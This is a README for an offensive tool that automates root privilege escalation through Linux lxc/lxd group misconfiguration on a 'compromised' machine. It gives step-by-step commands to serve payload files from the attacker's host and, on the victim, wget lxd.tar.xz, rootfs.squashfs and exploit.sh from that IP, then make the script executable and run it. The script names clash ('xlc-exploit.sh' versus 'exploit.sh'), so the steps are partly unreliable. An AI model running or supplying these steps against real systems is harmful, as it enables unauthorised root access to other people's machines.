# lxc-Privilage-Escalation

## Description

lxc Privilage Escalation Is An Automation Tool To Exploit The Linux xlc Group Misconfiguration Which Leads To Get High Previlage (root) In The Compromised Server Or Machine

## Requitements

<ul>
<li>python3 |-> To Start The Host Server With It</li>
<li>Linux Debian Based |-> Because It Written With Bash :) & The apt For Debian Based Distros Like:</li>
</ul>
<ol>
<li>Debain</li>
<li>Ubuntu</li>
<li>Kali</li>
<li>Parrot OS</li>
<li>Back Box (Ubuntu Based)</li>
</ol>

## Wiki
- Clone The Repository:

`git clone https://github.com/Cyber-Guy1/lxc-Privilage-Escalation.git`

- Or Download It As A zip File

- Get Into The Cloned Repository:

`cd lxc-Privilage-Escalation`

- Give It The Right Permission:

`chmod +x xlc-exploit.sh`

- Run It:

`./exploit.sh`

- After The Tool Finished It's Tasks Now Go To The Compromised Machine

- Upload The Files Which Will Be The Exploit For Us In The Compromised Machine By Doing:

 `wget http://[Your IP]:8000/lxd.tar.xz` <br>[-] For Example: `wget http://192.168.1.5:8000/lxd.tar.xz`<br><br><br>
 `wget http://[Your IP]:8000/rootfs.squashfs` <br>[-] For Example: `wget http://192.168.1.5:8000/rootfs.squashfs`<br><br><br>

- Then Upload The Exploitation Script:

`wget http://[Your IP]:8000/exploit.sh` [-] For Example: `wget http://192.168.1.5:8000/exploit.sh`

- Give It The Right Permission:

`chmod +x exploit.sh`

- Finally Run It:

`./exploit.sh`

## Welcome Root ;)
